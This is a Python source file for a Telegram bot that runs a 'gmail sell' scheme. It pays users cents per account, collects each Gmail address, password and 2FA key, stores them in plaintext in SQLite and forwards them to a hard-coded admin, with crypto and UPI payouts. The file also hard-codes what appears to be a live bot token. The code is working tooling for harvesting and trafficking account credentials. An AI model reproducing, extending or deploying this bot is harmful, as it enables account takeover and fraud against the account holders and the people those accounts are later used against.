import os
import sqlite3
import threading
from flask import Flask
import telebot
from telebot import types

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8710136196:AAGnUd4dRzJ5-nlFqW1gXNw3ETqRD-pAmHw"
ADMIN_ID = 6112720850  # Replace with your Telegram Numeric ID
CHANNEL_USERNAME = "@googlejobhubsudeb"  # Replace with your channel (e.g. @mychannel)
TUTORIAL_VIDEO_URL = "https://t.me/googlejobhubsudeb/3415"   # Replace with your video URL
SUPPORT_ADMIN_USER = "@SUDEBNOMERCY"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

# ==================== DATABASE SETUP ====================
def init_db():
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS tasks (
            task_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            gmail TEXT,
            password TEXT,
            two_fa TEXT,
            status TEXT DEFAULT 'Pending'
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            address TEXT,
            status TEXT DEFAULT 'Pending'
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user_balance(user_id):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if not row:
        cursor.execute("INSERT INTO users (user_id, balance) VALUES (?, 0.0)", (user_id,))
        conn.commit()
        bal = 0.0
    else:
        bal = row[0]
    conn.close()
    return bal

def update_user_balance(user_id, amount):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, balance) VALUES (?, 0.0)", (user_id,))
    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

# ==================== CHANNEL MEMBERSHIP CHECK ====================
def is_user_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        return status in ["member", "administrator", "creator"]
    except Exception:
        return True  # Fallback if bot is not admin in channel yet

# ==================== KEYBOARDS ====================
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    b1 = types.KeyboardButton("𝟭) 𝗧𝗮𝘀𝗸 📝")
    b2 = types.KeyboardButton("𝟮) 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗵𝗶𝘀𝘁𝗼𝗿𝘆 📜")
    b3 = types.KeyboardButton("𝟯) 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 💰")
    b4 = types.KeyboardButton("𝟰) 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 💳")
    b5 = types.KeyboardButton("𝟱) 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 📞")
    markup.add(b1, b2, b3, b4, b5)
    return markup

# ==================== USER FLOW ====================
user_task_data = {}
user_withdraw_data = {}

@bot.message_handler(commands=['start'])
def start_handler(message):
    user_id = message.from_user.id
    get_user_balance(user_id)

    if not is_user_subscribed(user_id):
        join_markup = types.InlineKeyboardMarkup()
        btn_channel = types.InlineKeyboardButton("📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
        btn_check = types.InlineKeyboardButton("✅ 𝗖𝗵𝗲𝗰𝗸 𝗝𝗼𝗶𝗻", callback_data="check_join")
        join_markup.add(btn_channel)
        join_markup.add(btn_check)
        bot.send_message(user_id, "⚠️ 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 🔔", reply_markup=join_markup)
        return

    welcome_text = (
        "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗼𝘂𝗿 𝗴𝗺𝗮𝗶𝗹 𝘀𝗲𝗹𝗹 𝗯𝗼𝘁 🤑🤑\n"
        "𝗘𝗮𝗿𝗻 𝗲𝘃𝗲𝗿𝘆 𝗴𝗺𝗮𝗶𝗹 𝟎.𝟑𝟐$ 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️\n"
        "𝟏 𝗬𝗲𝗮𝗿 𝗼𝗹𝗱 𝗴𝗺𝗮𝗶𝗹 𝗴𝗲𝘁 𝟎.𝟑𝟕$ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅️"
    )
    tutorial_markup = types.InlineKeyboardMarkup()
    btn_tut = types.InlineKeyboardButton("▶️ 𝗖𝗹𝗶𝗰𝗸 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗴𝗲𝘁 𝘁𝘂𝘁𝗼𝗿𝗶𝗮𝗹", url=TUTORIAL_VIDEO_URL)
    tutorial_markup.add(btn_tut)

    bot.send_message(user_id, welcome_text, reply_markup=tutorial_markup)
    bot.send_message(user_id, "👇 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄:", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def verify_join(call):
    if is_user_subscribed(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_handler(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗷𝗼𝗶𝗻𝗲𝗱 𝘆𝗲𝘁!", show_alert=True)

# ----------------- MAIN MENU BUTTON HANDLERS -----------------
@bot.message_handler(func=lambda msg: True)
def menu_navigation(message):
    user_id = message.from_user.id
    text = message.text

    if text == "𝟭) 𝗧𝗮𝘀𝗸 📝":
        user_task_data[user_id] = {}
        msg = bot.send_message(user_id, "📧 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝗮𝗱𝗱𝗿𝗲𝘀𝘀:")
        bot.register_next_step_handler(msg, process_gmail_step)

    elif text == "𝟮) 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗵𝗶𝘀𝘁𝗼𝗿𝘆 📜":
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        cursor.execute("SELECT task_id, gmail, password, two_fa, status FROM tasks WHERE user_id = ? ORDER BY task_id DESC", (user_id,))
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            bot.send_message(user_id, "📭 𝗡𝗼 𝘀𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗵𝗶𝘀𝘁𝗼𝗿𝘆 𝗳𝗼𝘂𝗻𝗱 𝘆𝗲𝘁.")
            return

        history_msg = "📜 <b><u>𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗛𝗶𝘀𝘁𝗼𝗿𝘆</u></b>:\n\n"
        for row in rows:
            status_icon = "⏳" if row[4] == "Pending" else ("✅" if row[4] == "Accepted" else "❌")
            history_msg += (
                f"🆔 <b>𝗧𝗮𝘀𝗸 𝗜𝗗:</b> <code>{row[0]}</code>\n"
                f"📧 <b>𝗚𝗺𝗮𝗶𝗹:</b> <code>{row[1]}</code>\n"
                f"🔑 <b>𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:</b> <code>{row[2]}</code>\n"
                f"🛡 <b>𝟮𝗙𝗔 𝗞𝗲𝘆:</b> <code>{row[3]}</code>\n"
                f"📊 <b>𝗦𝘁𝗮𝘁𝘂𝘀:</b> <b>{row[4]}</b> {status_icon}\n"
                "─────────────────────\n"
            )
        bot.send_message(user_id, history_msg)

    elif text == "𝟯) 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 💰":
        bal = get_user_balance(user_id)
        bot.send_message(user_id, f"💰 <b>𝗬𝗼𝘂𝗿 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝗮𝗹𝗮𝗻𝗰𝗲:</b> <code>${bal:.2f}</code> 💵")

    elif text == "𝟰) 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 💳":
        bal = get_user_balance(user_id)
        markup = types.InlineKeyboardMarkup()
        btn_usdt = types.InlineKeyboardButton("💵 𝗨𝗦𝗗𝗧 (𝗕𝗘𝗣𝟮𝟬)", callback_data="w_usdt")
        btn_upi = types.InlineKeyboardButton("🇮🇳 𝗨𝗣𝗜", callback_data="w_upi")
        markup.add(btn_usdt, btn_upi)
        bot.send_message(user_id, f"💳 <b>𝗬𝗼𝘂𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲:</b> <code>${bal:.2f}</code>\n📌 <b>𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹:</b> <code>$0.32</code>\n\n𝗦𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗺𝗲𝘁𝗵𝗼𝗱 👇", reply_markup=markup)

    elif text == "𝟱) 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 📞":
        bot.send_message(user_id, f"📞 <b>𝗙𝗼𝗿 𝗮𝗻𝘆 𝗵𝗲𝗹𝗽 𝗼𝗿 𝗶𝘀𝘀𝘂𝗲𝘀, 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘂𝗿 𝗮𝗱𝗺𝗶𝗻:</b> {SUPPORT_ADMIN_USER} 💬")

# ----------------- TASK SUBMISSION FLOW -----------------
def process_gmail_step(message):
    user_id = message.from_user.id
    user_task_data[user_id]['gmail'] = message.text
    msg = bot.send_message(user_id, "🔑 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:")
    bot.register_next_step_handler(msg, process_password_step)

def process_password_step(message):
    user_id = message.from_user.id
    user_task_data[user_id]['password'] = message.text

    tut_markup = types.InlineKeyboardMarkup()
    btn_tut = types.InlineKeyboardButton("▶️ 𝗛𝗼𝘄 𝘁𝗼 𝘀𝗲𝘁 𝟮𝗙𝗔", url=TUTORIAL_VIDEO_URL)
    tut_markup.add(btn_tut)

    msg = bot.send_message(user_id, "🛡 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗚𝗺𝗮𝗶𝗹 𝟮𝗙𝗔 𝗞𝗲𝘆:", reply_markup=tut_markup)
    bot.register_next_step_handler(msg, process_2fa_step)

def process_2fa_step(message):
    user_id = message.from_user.id
    two_fa = message.text
    gmail = user_task_data[user_id].get('gmail')
    password = user_task_data[user_id].get('password')

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO tasks (user_id, gmail, password, two_fa, status) VALUES (?, ?, ?, ?, 'Pending')", (user_id, gmail, password, two_fa))
    task_id = cursor.lastrowid
    conn.commit()
    conn.close()

    bot.send_message(user_id, f"✅ <b>𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝘀𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻!</b>\n🆔 <b>𝗧𝗮𝘀𝗸 𝗜𝗗:</b> <code>{task_id}</code>\n⏳ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗿𝗲𝘃𝗶𝗲𝘄.")

    # Notify Admin
    admin_markup = types.InlineKeyboardMarkup()
    btn_acc = types.InlineKeyboardButton("✅ 𝗔𝗰𝗰𝗲𝗽𝘁", callback_data=f"adm_accept_{task_id}")
    btn_rej = types.InlineKeyboardButton("❌ 𝗥𝗲𝗷𝗲𝗰𝘁", callback_data=f"adm_reject_{task_id}")
    admin_markup.add(btn_acc, btn_rej)

    admin_msg = (
        f"📥 <b><u>𝗡𝗲𝘄 𝗧𝗮𝘀𝗸 𝗦𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻</u></b>\n\n"
        f"🆔 <b>𝗧𝗮𝘀𝗸 𝗜𝗗:</b> <code>{task_id}</code>\n"
        f"👤 <b>𝗨𝘀𝗲𝗿 𝗜𝗗:</b> <code>{user_id}</code>\n"
        f"📧 <b>𝗚𝗺𝗮𝗶𝗹:</b> <code>{gmail}</code>\n"
        f"🔑 <b>𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:</b> <code>{password}</code>\n"
        f"🛡 <b>𝟮𝗙𝗔:</b> <code>{two_fa}</code>"
    )
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=admin_markup)

# ----------------- ADMIN TASK APPROVAL/REJECTION -----------------
@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_action_callback(call):
    data = call.data.split("_")
    action = data[1]
    task_id = int(data[2])

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, status FROM tasks WHERE task_id = ?", (task_id,))
    task = cursor.fetchone()

    if not task:
        conn.close()
        bot.answer_callback_query(call.id, "Task not found!")
        return

    user_id, status = task

    if action == "accept":
        rate_markup = types.InlineKeyboardMarkup()
        b_032 = types.InlineKeyboardButton("💵 𝟎.𝟑𝟐$", callback_data=f"credit_{task_id}_0.32")
        b_037 = types.InlineKeyboardButton("💵 𝟎.𝟑𝟕$", callback_data=f"credit_{task_id}_0.37")
        rate_markup.add(b_032, b_037)
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=rate_markup)
        bot.answer_callback_query(call.id, "Select amount to credit")

    elif action == "reject":
        cursor.execute("UPDATE tasks SET status = 'Rejected' WHERE task_id = ?", (task_id,))
        conn.commit()
        bot.edit_message_text(f"{call.message.text}\n\n❌ <b>𝗦𝘁𝗮𝘁𝘂𝘀: 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱</b>", call.message.chat.id, call.message.message_id)
        # Notify User
        bot.send_message(user_id, f"𝗬𝗼𝘂 𝘁𝗮𝘀𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗷𝗲𝗰𝘁𝗲𝗱 𝗽𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘂𝗿 𝗮𝗱𝗺𝗶𝗻 𝗳𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗲 {SUPPORT_ADMIN_USER} ❌")

    conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith("credit_"))
def admin_credit_callback(call):
    _, task_id, amount_str = call.data.split("_")
    task_id = int(task_id)
    amount = float(amount_str)

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM tasks WHERE task_id = ?", (task_id,))
    user_id = cursor.fetchone()[0]

    cursor.execute("UPDATE tasks SET status = 'Accepted' WHERE task_id = ?", (task_id,))
    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

    bot.edit_message_text(f"{call.message.text}\n\n✅ <b>𝗦𝘁𝗮𝘁𝘂𝘀: 𝗔𝗰𝗰𝗲𝗽𝘁𝗲𝗱 (+${amount:.2f})</b>", call.message.chat.id, call.message.message_id)
    bot.send_message(user_id, f"🎉 <b>𝗬𝗼𝘂𝗿 𝘁𝗮𝘀𝗸 (𝗜𝗗: {task_id}) 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!</b>\n💵 <b>+${amount:.2f}</b> 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 ✅")

# ----------------- WITHDRAWAL FLOW -----------------
@bot.callback_query_handler(func=lambda call: call.data in ["w_upi", "w_usdt"])
def withdraw_option_selected(call):
    user_id = call.from_user.id
    if call.data == "w_upi":
        bot.send_message(user_id, f"𝗙𝗼𝗿 𝘂𝗽𝗶 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘆𝗼𝘂 𝗺𝘂𝘀𝘁 𝗵𝗮𝘃𝗲 𝘁𝗼 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 {SUPPORT_ADMIN_USER} 📞")
    elif call.data == "w_usdt":
        bal = get_user_balance(user_id)
        if bal < 0.32:
            bot.send_message(user_id, f"⚠️ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲!</b>\n𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗶𝘀 <b>$0.32</b>. 𝗬𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: <code>${bal:.2f}</code>")
            return
        msg = bot.send_message(user_id, "💵 <b>𝗘𝗻𝘁𝗲𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗮𝗺𝗼𝘂𝗻𝘁 (𝗠𝗶𝗻𝗶𝗺𝘂𝗺 $0.32):</b>")
        bot.register_next_step_handler(msg, process_withdraw_amount)

def process_withdraw_amount(message):
    user_id = message.from_user.id
    try:
        amount = float(message.text)
    except ValueError:
        bot.send_message(user_id, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        return

    bal = get_user_balance(user_id)
    if amount < 0.32 or amount > bal:
        bot.send_message(user_id, f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁! 𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝗶𝘀 $0.32 𝗮𝗻𝗱 𝘆𝗼𝘂 𝗰𝗮𝗻𝗻𝗼𝘁 𝗲𝘅𝗰𝗲𝗲𝗱 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 (${bal:.2f}).")
        return

    user_withdraw_data[user_id] = {'amount': amount}
    msg = bot.send_message(user_id, "🔗 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 <b>𝗨𝗦𝗗𝗧 (𝗕𝗘𝗣𝟮𝟬)</b> 𝘄𝗮𝗹𝗹𝗲𝘁 𝗮𝗱𝗱𝗿𝗲𝘀𝘀:")
    bot.register_next_step_handler(msg, process_withdraw_address)

def process_withdraw_address(message):
    user_id = message.from_user.id
    address = message.text
    amount = user_withdraw_data[user_id]['amount']

    update_user_balance(user_id, -amount)

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO withdrawals (user_id, amount, address, status) VALUES (?, ?, ?, 'Pending')", (user_id, amount, address))
    wid = cursor.lastrowid
    conn.commit()
    conn.close()

    bot.send_message(user_id, f"✅ <b>𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝘀𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱!</b>\n💵 <b>𝗔𝗺𝗼𝘂𝗻𝘁:</b> <code>${amount:.2f}</code>\n🔗 <b>𝗔𝗱𝗱𝗿𝗲𝘀𝘀:</b> <code>{address}</code>\n⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝗼𝗼𝗻.")

    # Send to Admin
    w_markup = types.InlineKeyboardMarkup()
    btn_w_ok = types.InlineKeyboardButton("✅ 𝗣𝗮𝗶𝗱", callback_data=f"wd_paid_{wid}")
    btn_w_rej = types.InlineKeyboardButton("❌ 𝗥𝗲𝗷𝗲𝗰𝘁 & 𝗥𝗲𝗳𝘂𝗻𝗱", callback_data=f"wd_rej_{wid}")
    w_markup.add(btn_w_ok, btn_w_rej)

    bot.send_message(ADMIN_ID, f"💳 <b><u>𝗡𝗲𝘄 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 #{wid}</u></b>\n\n👤 <b>𝗨𝘀𝗲𝗿:</b> <code>{user_id}</code>\n💵 <b>𝗔𝗺𝗼𝘂𝗻𝘁:</b> <code>${amount:.2f}</code>\n🔗 <b>𝗕𝗘𝗣𝟮𝟬 𝗔𝗱𝗱𝗿𝗲𝘀𝘀:</b> <code>{address}</code>", reply_markup=w_markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("wd_"))
def withdrawal_admin_handler(call):
    _, action, wid = call.data.split("_")
    wid = int(wid)

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, amount, status FROM withdrawals WHERE id = ?", (wid,))
    row = cursor.fetchone()

    if not row or row[2] != 'Pending':
        conn.close()
        bot.answer_callback_query(call.id, "Already processed.")
        return

    user_id, amount, _ = row

    if action == "paid":
        cursor.execute("UPDATE withdrawals SET status = 'Completed' WHERE id = ?", (wid,))
        conn.commit()
        bot.edit_message_text(f"{call.message.text}\n\n✅ <b>𝗦𝘁𝗮𝘁𝘂𝘀: 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 / 𝗣𝗮𝗶𝗱</b>", call.message.chat.id, call.message.message_id)
        bot.send_message(user_id, f"🎉 <b>𝗬𝗼𝘂𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗼𝗳 ${amount:.2f} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!</b> ✅")
    elif action == "rej":
        cursor.execute("UPDATE withdrawals SET status = 'Rejected' WHERE id = ?", (wid,))
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        conn.commit()
        bot.edit_message_text(f"{call.message.text}\n\n❌ <b>𝗦𝘁𝗮𝘁𝘂𝘀: 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 & 𝗥𝗲𝗳𝘂𝗻𝗱𝗲𝗱</b>", call.message.chat.id, call.message.message_id)
        bot.send_message(user_id, f"❌ <b>𝗬𝗼𝘂𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗼𝗳 ${amount:.2f} 𝘄𝗮𝘀 𝗿𝗲𝗷𝗲𝗰𝘁𝗲𝗱. 𝗔𝗺𝗼𝘂𝗻𝘁 𝗿𝗲𝗳𝘂𝗻𝗱𝗲𝗱 𝘁𝗼 𝗯𝗮𝗹𝗮𝗻𝗰𝗲.</b>")

    conn.close()

# ----------------- ADMIN COMMANDS -----------------
@bot.message_handler(commands=['addbalance'])
def admin_add_balance(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        parts = message.text.split()
        target_user = int(parts[1])
        amount = float(parts[2])
        update_user_balance(target_user, amount)
        bot.send_message(ADMIN_ID, f"✅ 𝗔𝗱𝗱𝗲𝗱 ${amount:.2f} 𝘁𝗼 𝘂𝘀𝗲𝗿 <code>{target_user}</code>.")
        bot.send_message(target_user, f"💰 <b>𝗔𝗱𝗺𝗶𝗻 𝗮𝗱𝗱𝗲𝗱 ${amount:.2f} 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲!</b>")
    except Exception as e:
        bot.send_message(ADMIN_ID, "⚠️ 𝗨𝘀𝗮𝗴𝗲: <code>/addbalance <user_id> <amount></code>")

@bot.message_handler(commands=['removebalance'])
def admin_remove_balance(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        parts = message.text.split()
        target_user = int(parts[1])
        amount = float(parts[2])
        update_user_balance(target_user, -amount)
        bot.send_message(ADMIN_ID, f"✅ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ${amount:.2f} 𝗳𝗿𝗼𝗺 𝘂𝘀𝗲𝗿 <code>{target_user}</code>.")
        bot.send_message(target_user, f"⚠️ <b>𝗔𝗱𝗺𝗶𝗻 𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 ${amount:.2f} 𝗳𝗿𝗼𝗺 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲.</b>")
    except Exception as e:
        bot.send_message(ADMIN_ID, "⚠️ 𝗨𝘀𝗮𝗴𝗲: <code>/removebalance <user_id> <amount></code>")

@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        return
    msg = bot.send_message(ADMIN_ID, "📢 𝗦𝗲𝗻𝗱 𝗺𝗲 𝘁𝗵𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 (𝗼𝗿 𝗽𝗵𝗼𝘁𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻) 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁:")
    bot.register_next_step_handler(msg, process_broadcast_message)

def process_broadcast_message(message):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()

    sent = 0
    for (u_id,) in users:
        try:
            if message.content_type == 'photo':
                bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption or "")
            else:
                bot.send_message(u_id, message.text)
            sent += 1
        except Exception:
            continue
    bot.send_message(ADMIN_ID, f"✅ <b>𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!</b> 𝗦𝗲𝗻𝘁 𝘁𝗼 {sent} 𝘂𝘀𝗲𝗿𝘀.")

# ==================== RENDER / FLASK KEEP-ALIVE ====================
@app.route('/')
def home():
    return "Bot is running perfectly 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    bot.infinity_polling(skip_pending=True)
